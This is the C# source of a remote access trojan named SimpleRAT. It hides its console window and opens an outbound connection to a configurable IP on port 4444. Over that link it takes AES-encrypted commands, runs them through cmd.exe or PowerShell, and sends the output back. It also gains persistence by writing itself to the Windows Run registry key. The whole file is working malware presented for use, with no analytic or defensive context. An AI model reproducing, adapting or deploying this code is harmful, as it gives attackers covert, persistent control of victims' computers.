using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace SimpleRAT
{
    class Program
    {
        private static readonly string key = "0123456789abcdef0123456789abcdef"; // 32 bytes for AES-256
        private static readonly string iv = "abcdef9876543210"; // 16 bytes for AES

        static void Main(string[] args)
        {
            // Hide console window
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            // Configuration
            string ipAddress = "192.168.1.69"; // Change to the server's IP address
            int port = 4444; // Change to the desired port number

            // Retry connecting for 30 seconds
            DateTime endTime = DateTime.Now.AddSeconds(30);
            while (DateTime.Now < endTime)
            {
                if (ReverseShell(ipAddress, port))
                    break;
                Thread.Sleep(2000); // Wait for 2 seconds before retrying
            }
        }

        static bool ReverseShell(string ipAddress, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient(ipAddress, port))
                {
                    using (NetworkStream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                            {
                                while (true)
                                {
                                    string encryptedCommand = reader.ReadLine();
                                    string command = DecryptString(encryptedCommand);
                                    if (command == "terminate")
                                    {
                                        break;
                                    }

                                    switch (command)
                                    {
                                        case "cmd":
                                            ExecuteShell("cmd.exe", reader, writer);
                                            break;
                                        case "powershell":
                                            ExecuteShell("powershell.exe", reader, writer);
                                            break;
                                        case "persistence":
                                            EstablishPersistence(writer, reader);
                                            break;
                                        default:
                                            writer.WriteLine(EncryptString("Invalid command received."));
                                            writer.Flush();
                                            break;
                                    }
                                }
                            }
                        }
                    }
                }
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                return false;
            }
        }

        static void ExecuteShell(string shell, StreamReader reader, StreamWriter writer)
        {
            using (Process shellProcess = new Process())
            {
                shellProcess.StartInfo.FileName = shell;
                shellProcess.StartInfo.RedirectStandardInput = true;
                shellProcess.StartInfo.RedirectStandardOutput = true;
                shellProcess.StartInfo.RedirectStandardError = true;
                shellProcess.StartInfo.UseShellExecute = false;
                shellProcess.StartInfo.CreateNoWindow = true;

                shellProcess.OutputDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        writer.WriteLine(EncryptString(e.Data));
                        writer.Flush();
                    }
                };
                shellProcess.ErrorDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        writer.WriteLine(EncryptString(e.Data));
                        writer.Flush();
                    }
                };

                shellProcess.Start();
                shellProcess.BeginOutputReadLine();
                shellProcess.BeginErrorReadLine();

                string input;
                while ((input = DecryptString(reader.ReadLine())) != "!!menu")
                {
                    shellProcess.StandardInput.WriteLine(input);
                    shellProcess.StandardInput.Flush();
                }

                shellProcess.StandardInput.WriteLine("exit");
                shellProcess.WaitForExit();
                writer.WriteLine(EncryptString("Returning to menu..."));
                writer.Flush();
            }
        }

        static void EstablishPersistence(StreamWriter writer, StreamReader reader)
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string keyName = "MyAppPersistence";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue(keyName, exePath);
                }

                writer.WriteLine(EncryptString("Persistence established."));
                writer.Flush();

                // Keep reading until !!menu is received
                string input;
                while ((input = DecryptString(reader.ReadLine())) != "!!menu")
                {
                    writer.WriteLine(EncryptString("Type '!!menu' to return to the main menu."));
                    writer.Flush();
                }

                writer.WriteLine(EncryptString("Returning to menu..."));
                writer.Flush();
            }
            catch (Exception ex)
            {
                writer.WriteLine(EncryptString($"Error establishing persistence: {ex.Message}"));
                writer.Flush();

                // Keep reading until !!menu is received
                string input;
                while ((input = DecryptString(reader.ReadLine())) != "!!menu")
                {
                    writer.WriteLine(EncryptString("Type '!!menu' to return to the main menu."));
                    writer.Flush();
                }

                writer.WriteLine(EncryptString("Returning to menu..."));
                writer.Flush();
            }
        }

        static string EncryptString(string plainText)
        {
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = Encoding.UTF8.GetBytes(iv);
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        static string DecryptString(string encryptedText)
        {
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = Encoding.UTF8.GetBytes(iv);
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;
    }
}
